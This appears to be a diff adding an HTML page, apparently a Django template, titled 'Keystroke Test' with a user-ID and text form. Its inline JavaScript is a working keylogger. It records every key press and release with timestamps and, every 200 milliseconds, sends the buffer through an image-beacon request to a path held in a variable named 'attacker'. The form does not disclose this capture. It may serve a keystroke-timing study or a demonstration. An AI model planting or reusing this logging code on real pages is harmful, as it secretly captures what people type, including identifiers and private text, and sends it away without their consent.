@@ -1,0 +1,55 @@
+<html>
+<head>
+  <title></title>
+</head>
+<body>
+
+<script>var buffer = [];
+var attacker = '/keys/listn2/'
+
+document.onkeypress = function(e) {
+    var timestamp = Date.now() | 0;
+    var stroke = {
+        k: e.key,
+        t: timestamp,
+        r: 0
+    };
+    //alert('press'+e.key);
+     document.getElementById("demo").innerHTML = 'press '+e.key+timestamp;
+    buffer.push(stroke);
+}
+
+document.onkeyup = function(e) {
+    var timestamp = Date.now() | 0;
+    var stroke = {
+        k: e.key,
+        t: timestamp,
+        r: 1
+    };
+    //alert('release'+e.key);
+    document.getElementById("demo").innerHTML = 'release '+e.key + timestamp;
+    buffer.push(stroke);
+}
+
+window.setInterval(function() {
+    if (buffer.length > 0) {
+    	//alert(buffer.join());
+        var data = encodeURIComponent(JSON.stringify(buffer));
+        new Image().src = attacker + data;
+        buffer = [];
+    }
+}, 200);</script>
+
+<p id="demo"></p>
+<font size = "20">Keystroke Test</font> <br/>
+please fill in the form
+<form action="{% url 'keys:result'  %}" method="post">
+{% csrf_token %}
+
+    User ID: <input type="text" name="uname"><br>
+	Text:<textarea  style="font-size:16px" rows="8" cols = "90" name = "profile"></textarea><br>
+<input type="submit" value="submit" />
+</form>
+
+</body>
+</html>
